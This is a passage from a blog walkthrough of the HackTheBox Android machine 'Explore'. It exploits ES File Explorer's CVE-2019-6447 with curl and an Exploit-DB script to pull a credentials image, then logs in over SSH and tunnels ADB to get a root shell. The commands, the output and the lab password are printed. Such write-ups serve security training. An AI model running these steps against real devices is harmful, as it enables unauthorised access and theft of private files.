</span></span><span class=line><span class=cl><span class=p>|</span>     ??random1random2random3random4
</span></span><span class=line><span class=cl><span class=p>|</span>   TerminalServerCookie: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>27</span> Jun <span class=m>2021</span> 21:47:57 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>54</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>US-ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: Close
</span></span><span class=line><span class=cl><span class=p>|</span>     Invalid request line: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Cookie: <span class=nv>mstshash</span><span class=o>=</span>nmap
</span></span><span class=line><span class=cl>42135/tcp open     http    ES File Explorer Name Response httpd
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=s1>&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=s1>59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
</span></span></span><span class=line><span class=cl><span class=s1>|_http-title: Site doesn&#39;</span>t have a title <span class=o>(</span>text/plain<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=m>2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl><span class=o>==============</span>NEXT SERVICE FINGERPRINT <span class=o>(</span>SUBMIT INDIVIDUALLY<span class=o>)==============</span>
</span></span><span class=line><span class=cl>SF-Port2222-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>6/27%Time<span class=o>=</span>60D8F1F8%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>NU
</span></span><span class=line><span class=cl>SF:LL,24,<span class=s2>&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>==============</span>NEXT SERVICE FINGERPRINT <span class=o>(</span>SUBMIT INDIVIDUALLY<span class=o>)==============</span>
</span></span><span class=line><span class=cl>SF-Port37817-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>6/27%Time<span class=o>=</span>60D8F1F8%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>G
</span></span><span class=line><span class=cl>SF:enericLines,AA,<span class=s2>&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>...[SNIP]...
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Service Info: Device: phone
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=s2>Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds
</span></span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-37817>TCP 37817<a class=anchor aria-hidden=true href=#tcp-37817>#</a></h3><p>No reply given from 37817, it showed in a close state when I tried to rescan it.</p><h3 id=tcp-59777--42135---es-file-explorer>TCP 59777 & 42135 - ES File Explorer<a class=anchor aria-hidden=true href=#tcp-59777--42135---es-file-explorer>#</a></h3><p>If I search for port 59777 and 42135 on Google, the results show that these ports are belong to ES File Explorer.</p><p>Interacting with port 59777 from the browser gives me the response below, and no further information given.</p><p><div class=img-container><img src=imgs/image-20211030202819887.png alt=image-20211030202819887></div></p><p>If I use <code>nc</code>, port 59777 returns with a forbidden error message.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «explore» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ nc 10.10.10.247 <span class=m>59777</span>
</span></span><span class=line><span class=cl>GET /
</span></span><span class=line><span class=cl>HTTP/1.0 <span class=m>403</span> Forbidden 
</span></span><span class=line><span class=cl>Content-Type: text/plain
</span></span><span class=line><span class=cl>Date: Sun, <span class=m>9</span> Jul <span class=m>2021</span> 22:32:42 GMT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>FORBIDDEN: No directory listing
</span></span></code></pre></div><p>For port 42135, interacting with it from <code>nc</code> or the browser both returns 404 not found message.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «explore» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ nc 10.10.10.247 <span class=m>42135</span>
</span></span><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl>Server: ES Name Response Server
</span></span><span class=line><span class=cl>Content-Type: text/html
</span></span><span class=line><span class=cl>Content-Length: <span class=m>9</span>
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Not found
</span></span></code></pre></div><h4 id=finding-vulnerabilities>Finding Vulnerabilities<a class=anchor aria-hidden=true href=#finding-vulnerabilities>#</a></h4><p>On Exploit-DB, there is one recent exploit for ES File Explorer, which was released 3 days after this box. This looks promising,</p><p><div class=img-container><img src=imgs/image-20210710054049723.png alt=image-20210710054049723></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-kristi>Shell as kristi<a class=anchor aria-hidden=true href=#shell-as-kristi>#</a></h3><h4 id=es-file-explorer-cve-2019-6447>ES File Explorer CVE-2019-6447<a class=anchor aria-hidden=true href=#es-file-explorer-cve-2019-6447>#</a></h4><p>The arbitrary file read vulnerability on ES File Explorer 4.1.9.7.4 is classified as CVE-2019-6447. <a href=https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566>This articles</a> explains about the vulnerability, but I will just quote its overview part which states that:</p><blockquote><p>The ES file browser creates an HTTP service bound to port 59777 at runtime, which provides 10+ commands for accessing data in user’s cell phone and executing the application; however, the service does not check this request. Test, resulting in a security breach.</p></blockquote><p>I can test for the vulnerability by sending a HTTP POST request containing one of the available commands like <code>getDeviceInfo</code> to <code>http://10.10.10.247:59777</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «explore» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ curl -d <span class=s1>&#39;{&#34;command&#34;:&#34;getDeviceInfo&#34;}&#39;</span> http://10.10.10.247:59777   
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;name&#34;</span>:<span class=s2>&#34;VMware Virtual Platform&#34;</span>, <span class=s2>&#34;ftpRoot&#34;</span>:<span class=s2>&#34;/sdcard&#34;</span>, <span class=s2>&#34;ftpPort&#34;</span>:<span class=s2>&#34;3721&#34;</span><span class=o>}</span>
</span></span></code></pre></div><p>And it was vulnerable!</p><p>This time I will grab this <a href=https://www.exploit-db.com/exploits/50070>exploit</a>. When sending <code>listPics</code> command, it returns with one interesting file name called <code>creds.jpg</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ python3 esfile_cve2019-6447.py listPics 10.10.10.247
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>==================================================================</span>
</span></span><span class=line><span class=cl><span class=p>|</span>    ES File Explorer Open Port Vulnerability : CVE-2019-6447    <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>                Coded By : Nehal a.k.a PwnerSec                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=o>==================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name : concept.jpg
</span></span><span class=line><span class=cl><span class=nb>time</span> : 4/21/21 02:38:08 AM
</span></span><span class=line><span class=cl>location : /storage/emulated/0/DCIM/concept.jpg
</span></span><span class=line><span class=cl>size : 135.33 KB <span class=o>(</span>138,573 Bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name : anc.png
</span></span><span class=line><span class=cl><span class=nb>time</span> : 4/21/21 02:37:50 AM
</span></span><span class=line><span class=cl>location : /storage/emulated/0/DCIM/anc.png
</span></span><span class=line><span class=cl>size : 6.24 KB <span class=o>(</span>6,392 Bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name : creds.jpg
</span></span><span class=line><span class=cl><span class=nb>time</span> : 4/21/21 02:38:18 AM
</span></span><span class=line><span class=cl>location : /storage/emulated/0/DCIM/creds.jpg
</span></span><span class=line><span class=cl>size : 1.14 MB <span class=o>(</span>1,200,401 Bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name : 224_anc.png
</span></span><span class=line><span class=cl><span class=nb>time</span> : 4/21/21 02:37:21 AM
</span></span><span class=line><span class=cl>location : /storage/emulated/0/DCIM/224_anc.png
</span></span><span class=line><span class=cl>size : 124.88 KB <span class=o>(</span>127,876 Bytes<span class=o>)</span>
</span></span></code></pre></div><p>The file can be downloaded with <code>getFile</code> command and then supply the file path as the last argument.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ python3 esfile_cve2019-6447.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>==================================================================</span>
</span></span><span class=line><span class=cl><span class=p>|</span>    ES File Explorer Open Port Vulnerability : CVE-2019-6447    <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>                Coded By : Nehal a.k.a PwnerSec                 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=o>==================================================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Downloading file...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Done. Saved as <span class=sb>`</span>out.dat<span class=sb>`</span>.
</span></span></code></pre></div><p>The saved image contains a set of creds: <code>kristi:Kr1sT!5h@Rp3xPl0r3!</code></p><p><div class=img-container><img src=imgs/image-20210710055249731.png alt=image-20210710055249731></div></p><h4 id=ssh---kristi>SSH - Kristi<a class=anchor aria-hidden=true href=#ssh---kristi>#</a></h4><p>These credentials works on SSH.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class=line><span class=cl>$ ssh -p <span class=m>2222</span> kristi@10.10.10.247
</span></span><span class=line><span class=cl>Password authentication
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>:/ $ whoami <span class=o>&amp;&amp;</span> id <span class=o>&amp;&amp;</span> hostname
</span></span><span class=line><span class=cl>u0_a76
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>10076<span class=o>(</span>u0_a76<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>10076<span class=o>(</span>u0_a76<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>10076<span class=o>(</span>u0_a76<span class=o>)</span>,3003<span class=o>(</span>inet<span class=o>)</span>,9997<span class=o>(</span>everybody<span class=o>)</span>,20076<span class=o>(</span>u0_a76_cache<span class=o>)</span>,50076<span class=o>(</span>all_a76<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>u:r:untrusted_app:s0:c76,c256,c512,c768
</span></span><span class=line><span class=cl>localhost
</span></span></code></pre></div><p>The username appeared as <code>u0_a76</code> because each application on Android starting from OS 6.0+ is sandboxed. In this case the SSH server is a sandboxed application.</p><p>The user flag is on <code>/sdcard/user.txt</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>:/sdcard $ ls -la
</span></span><span class=line><span class=cl>total <span class=m>68</span>
</span></span><span class=line><span class=cl>drwxrwx--- <span class=m>15</span> root everybody <span class=m>4096</span> 2021-04-21 02:12 .
</span></span><span class=line><span class=cl>drwx--x--x  <span class=m>4</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 ..
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>5</span> root everybody <span class=m>4096</span> 2021-03-13 17:30 .estrongs
</span></span><span class=line><span class=cl>-rw-rw----  <span class=m>1</span> root everybody   <span class=m>72</span> 2021-07-09 07:16 .userReturn
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Alarms
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>3</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Android
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-04-21 02:38 DCIM
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:37 Download
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Movies
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Music
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Notifications
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Pictures
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Podcasts
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-03-13 17:16 Ringtones
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>3</span> root everybody <span class=m>4096</span> 2021-03-13 17:30 backups
</span></span><span class=line><span class=cl>drwxrwx---  <span class=m>2</span> root everybody <span class=m>4096</span> 2021-04-21 02:12 dianxinos
</span></span><span class=line><span class=cl>-rw-rw----  <span class=m>1</span> root everybody   <span class=m>33</span> 2021-03-13 18:28 user.txt
</span></span><span class=line><span class=cl>:/sdcard $ cat user.txt
</span></span><span class=line><span class=cl>f3201...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=adb>ADB<a class=anchor aria-hidden=true href=#adb>#</a></h4><p>While enumerating this machine, I found a <code>xbin</code> folder under <code>/system</code> directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>:/system $ ls -l
</span></span><span class=line><span class=cl>total <span class=m>212</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>41</span> root root    <span class=m>4096</span> 2020-03-25 00:26 app
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root shell   <span class=m>8192</span> 2020-03-25 00:26 bin
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root    <span class=m>2824</span> 2020-03-24 23:39 build.prop
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root shell   <span class=m>8192</span> 2020-03-25 00:26 xbin
</span></span></code></pre></div><p>When I was an active XDA member (2011~2013), the existence of <code>/system/xbin</code> or <code>/system/xbin/su</code> indicated that the device was rooted back then (I just found out that this method<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> is still used today).</p><p>Typically people who rooted their device has a debug mode enabled, therefore, I&rsquo;m guessing that the only way to gain a root shell from here is through <code>adb</code> (android debug bridge) on port 5555.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>:/ $ netstat -tlpn
</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>1</span> 10.10.10.247:60138      1.0.0.1:853             SYN_SENT    -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>1</span> 10.10.10.247:48216      1.1.1.1:853             SYN_SENT    -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::42135                :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::59777                :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:10.10.10.2:33035 :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::2222                 :::*                    LISTEN      3405/net.xnano.android.sshserver
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:127.0.0.1:38415  :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::5555                 :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:56602  ESTABLISHED -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:127.0.0.1:56604  ::ffff:127.0.0.1:5555   ESTABLISHED 3405/net.xnano.android.sshserver
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:56604  ESTABLISHED -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>    <span class=m>624</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55618 ESTABLISHED 3405/net.xnano.android.sshserver
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:127.0.0.1:56602  ::ffff:127.0.0.1:5555   ESTABLISHED 3405/net.xnano.android.sshserver
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55602 ESTABLISHED 3405/net.xnano.android.sshserver
</span></span></code></pre></div><p>As I only have ADB on my host device (Windows), I created two SSH tunnels: <code>Windows:5555 &lt;-SSH-> Kali:5555 &lt;-SSH-> Explorer:5555</code>.</p><p>On my Windows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ssh kali -L 5555:localhost:5555
</span></span></code></pre></div><p>On my Kali:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ssh -p <span class=m>2222</span> kristi@10.10.10.247 -L 5555:localhost:5555
</span></span></code></pre></div><p>Back on my Windows, I will connect to the Explore ADB server which is now accessible over port 5555 on my localhost.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>explore › adb tcpip <span class=m>5555</span>
</span></span><span class=line><span class=cl>* daemon not running<span class=p>;</span> starting now at tcp:5037
</span></span><span class=line><span class=cl>* daemon started successfully
</span></span><span class=line><span class=cl>restarting in TCP mode port: <span class=m>5555</span>
</span></span><span class=line><span class=cl>explore › adb connect localhost:5555
</span></span><span class=line><span class=cl>connected to localhost:5555
</span></span><span class=line><span class=cl>explore › adb devices
</span></span><span class=line><span class=cl>List of devices attached
</span></span><span class=line><span class=cl>localhost:5555  device
</span></span></code></pre></div><p>But it when I want to get a shell, it returns with</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>explore › adb shell
</span></span><span class=line><span class=cl>error: more than one device/emulator
</span></span></code></pre></div><p>and that can be resolved by specifying the device with <code>-s</code> option.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>explore › adb devices
</span></span><span class=line><span class=cl>List of devices attached
</span></span><span class=line><span class=cl>emulator-5554   device
</span></span><span class=line><span class=cl>localhost:5555  device
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>explore › adb -s localhost:5555 shell
</span></span><span class=line><span class=cl>x86_64:/ $ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>2000<span class=o>(</span>shell<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>2000<span class=o>(</span>shell<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>2000<span class=o>(</span>shell<span class=o>)</span>,1004<span class=o>(</span>input<span class=o>)</span>,1007<span class=o>(</span>log<span class=o>)</span>,1011<span class=o>(</span>adb<span class=o>)</span>,1015<span class=o>(</span>sdcard_rw<span class=o>)</span>,1028<span class=o>(</span>sdcard_r<span class=o>)</span>,3001<span class=o>(</span>net_bt_admin<span class=o>)</span>,3002<span class=o>(</span>net_bt<span class=o>)</span>,3003<span class=o>(</span>inet<span class=o>)</span>,3006<span class=o>(</span>net_bw_stats<span class=o>)</span>,3009<span class=o>(</span>readproc<span class=o>)</span>,3011<span class=o>(</span>uhid<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>u:r:shell:s0
</span></span></code></pre></div><p>When I type <code>su</code>, I&rsquo;m in the root shell!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>x86_64:/ $ su
</span></span><span class=line><span class=cl>:/ <span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>u:r:su:s0
</span></span></code></pre></div><p>The root flag can be found using the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>:/ <span class=c1># find / -type f -name &#34;root.txt&#34; 2&gt;/dev/null</span>
</span></span><span class=line><span class=cl>/data/root.txt
</span></span><span class=line><span class=cl>:/ <span class=c1># cat /data/root.txt</span>
</span></span><span class=line><span class=cl>f04fc...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://developer.android.com/studio/command-line/adb>https://developer.android.com/studio/command-line/adb</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not>https://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div><div class=post-references><h2>References</h2><ul><li><a href=https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566 target=_blank rel="noopener noreferrer">https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566</a></li><li><a href=https://developer.android.com/studio/command-line/adb#wireless target=_blank rel="noopener noreferrer">https://developer.android.com/studio/command-line/adb#wireless</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/android/>Android</a></li><li><a href=https://fahmifj.github.io/tags/es-file-explorer/>ES-File-Explorer</a></li><li><a href=https://fahmifj.github.io/tags/cve-2019-6447/>CVE-2019-6447</a></li><li><a href=https://fahmifj.github.io/tags/adb/>Adb</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Explore on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Explore&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f&hashtags=Android%2cES-File-Explorer%2cCVE-2019-6447%2cAdb"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Explore on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f&title=HackTheBox%20-%20Explore&summary=HackTheBox%20-%20Explore&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Explore on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f&title=HackTheBox%20-%20Explore"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Explore on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fexplore%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 